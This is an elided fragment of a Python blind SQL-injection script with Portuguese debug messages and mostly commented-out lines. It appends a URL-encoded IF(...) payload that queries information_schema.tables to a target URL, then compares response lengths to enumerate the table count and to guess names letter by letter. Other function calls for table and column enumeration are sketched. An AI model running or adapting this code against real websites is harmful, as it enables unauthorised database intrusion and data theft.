...
#     while True:
#         new_url = url + f"%20and%20IF((select%20count(*)%20from%20information_schema.tables%20where%20table_schema%20=%20%27{db_name}%27)={i},1,NULL)"
#         response = requests.get(new_url)
#         content = response.content
#         content_length_new = len(content)
#         ##DEBUG
#         print(f"tantando tamanho: {i} --- padrao//novo: {content_length}//{content_length_new}")
#         if content_length_new != content_length:
#             i += 1
#         else:
#             break
...
#             #DEBUG
#             print(f"tentando letra: {letras[j]} --- padrao//novo: {content_length}//{content_length_new}")
#             #FIM DEBUG
...
if response.status_code == 200:
        ...
        # print(f'O comprimento do banco de dados é: {db_length}')
        ...
        #tb_length = tbLength(url, content_length, qtd_tables,db_name)
        #print(f"array: {tb_length}")
        #qtd_columns = clQtd(url, tb_name, content_length, qtd_tables)
        #print(f"quantidade de colunas {qtd_columns}")
